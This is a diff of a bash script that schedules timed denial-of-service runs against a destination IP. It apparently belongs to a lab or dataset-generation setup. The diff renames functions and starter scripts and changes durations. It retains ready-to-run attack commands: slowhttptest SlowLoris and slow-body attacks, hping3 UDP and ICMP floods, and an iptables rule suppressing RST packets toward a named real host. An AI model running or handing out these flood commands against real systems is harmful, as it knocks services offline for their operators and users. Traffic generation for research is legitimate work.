@@ -23,18 +23,18 @@ attack(){
     echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
-    ./attack.sh $1 $2 $3 "$4"
+    ./attack_starter.sh $1 $2 $3 "$4"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 }
 
-mul_attack(){
+two_attacks(){
     #Write to file
     echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
-    ./mul_attacks.sh $1 $2 $3 "$4" "$5"
+    ./two_attacks_starter.sh $1 $2 $3 "$4" "$5"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
@@ -61,7 +61,7 @@ echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 
 #Define variables for attack 2
 attack_type="SlowLoris"
-attack_duration=$((9*60)) # in seconds
+attack_duration=$((13*60)) # in seconds
 attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
@@ -184,7 +184,7 @@ attack_duration=$((15*60)) # in seconds
 attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
 attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"
 
-mul_attack $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
+two_attacks $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
 
 
 #Write to file
@@ -202,7 +202,7 @@ attack_duration=$((10*60)) # in seconds
 attack_script1="hping3 --flood -1 $destination_ip"
 attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"
 
-mul_attack $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
+two_attacks $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
 
 iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP
 
